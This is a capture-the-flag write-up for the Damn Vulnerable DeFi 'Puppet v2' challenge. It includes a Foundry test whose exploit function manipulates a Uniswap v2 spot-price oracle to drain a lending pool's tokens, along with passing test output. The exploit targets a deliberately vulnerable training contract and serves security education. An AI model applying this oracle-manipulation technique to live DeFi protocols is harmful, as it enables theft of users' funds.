# Damn Vulnerable DeFi (Foundry version)

- [Scope](#scope)
- [Plan](#plan)
- [Solution](#solution)
  - [Proof of Concept](#proof-of-concept)

## Challenge #9 - Puppet v2 - Description

The developers of the last lending pool are saying that they've learned the lesson. And just released a new version!

Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.

You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)

## Scope

| File Name                                                                 | SHA-1 Hash                               |
| ------------------------------------------------------------------------- | ---------------------------------------- |
| damn-vulnerable-defi-foundry/src/Contracts/puppet-v2/Interfaces.sol       | a0fd58cda9b1368763a82fb7eeb2688dc22f588b |
| damn-vulnerable-defi-foundry/src/Contracts/puppet-v2/IUniswapV2Pair.sol   | 4d50fe6ddb44138b1d3e90d88a88d943ab612d6a |
| damn-vulnerable-defi-foundry/src/Contracts/puppet-v2/PuppetV2Pool.sol     | 81d8ca264bcf31c026e78f3eb34c71afc4780b4e |
| damn-vulnerable-defi-foundry/src/Contracts/puppet-v2/UniswapV2Library.sol | 113cef9d817c64bc46513b6daa119a22fd81bb7f |

## Plan

More or less the same plan as in Challenge #8 - Puppet.

## Solution

1.  Give all of our DVTs for ETH through Uniswap.
2.  Change ETH to WETH.
3.  Borrow all the DVTs from the pool.

<details>
    <summary>Description</summary>

</details>

<details>
    <summary>damn-vulnerable-defi-foundry/test/Levels/puppet-v2/PuppetV2.t.sol</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";

import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";

import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";

contract PuppetV2 is Test {
    // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;

    // pool will start with 1_000_000 DVT
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;

    DamnValuableToken internal dvt;
    WETH9 internal weth;

    PuppetV2Pool internal puppetV2Pool;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
        vm.label(deployer, "deployer");

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));

        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Deploy the lending pool
        puppetV2Pool = new PuppetV2Pool(
            address(weth),
            address(dvt),
            address(uniswapV2Pair),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetV2Pool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(puppetV2Pool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);

        assertEq(puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300_000 ether);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);

        address[] memory t = new address[](2);
        t[0] = address(dvt);
        t[1] = address(weth);

        uniswapV2Router.swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 1, t, attacker, DEADLINE);
        uint256 balance = attacker.balance;
        weth.deposit{value: balance}();
        weth.approve(address(puppetV2Pool), balance);
        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */

        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
    }
}
```

</details>

### Proof of Concept

```
./run.sh 9
[⠆] Compiling...
[⠢] Compiling 1 files with 0.8.17
[⠆] Solc 0.8.17 finished in 855.78ms
Compiler run successful

Running 1 test for test/Levels/puppet-v2/PuppetV2.t.sol:PuppetV2
[PASS] testExploit() (gas: 233646)
Logs:
  🧨 Let's see if you can break it... 🧨

🎉 Congratulations, you can go to the next level! 🎉

Test result: ok. 1 passed; 0 failed; finished in 3.99ms
```
